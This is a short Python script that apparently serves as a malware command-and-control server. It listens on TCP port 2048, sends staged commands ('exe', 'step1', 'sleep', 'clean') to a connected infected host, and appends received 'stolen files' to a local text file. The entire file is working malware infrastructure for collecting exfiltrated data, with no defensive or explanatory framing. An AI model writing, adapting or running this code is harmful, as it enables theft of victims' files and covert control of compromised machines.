import socket,time,os

HOST = '0.0.0.0'
PORT = 2048
PORTa = 2049
BUFFER_SIZE = 4096
a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
a.bind((HOST,PORT))
print('server listening')
a.listen(5)
connection,address = a.accept()


dd = str(connection)

while True:
    data = connection.recv(1024)
    if data.decode() == 'alive':
        print(data)
        time.sleep(1)
        print(f"connection establsihed from : {address[0]}")
        connection.send('exe'.encode())
    elif data.decode() == 'load':
        print('malware executed')
        time.sleep(1)
        print('sending step1')
        connection.send('step1'.encode())
    elif data.decode().__contains__('bot'):
        print('sending sleep ')
        time.sleep(1)
        connection.send('sleep'.encode())
  
    elif data.decode().__contains__('xxx'):
        print('stolen files')
        yu = open('stolenzzzz.txt','a')
        yu.writelines(data.decode())
        connection.send('clean'.encode())
        print('cleaning up')
        
    else:        
  
        print(data.decode())
        msg = 'standard'   
        time.sleep(1)
        connection.send(msg.encode())
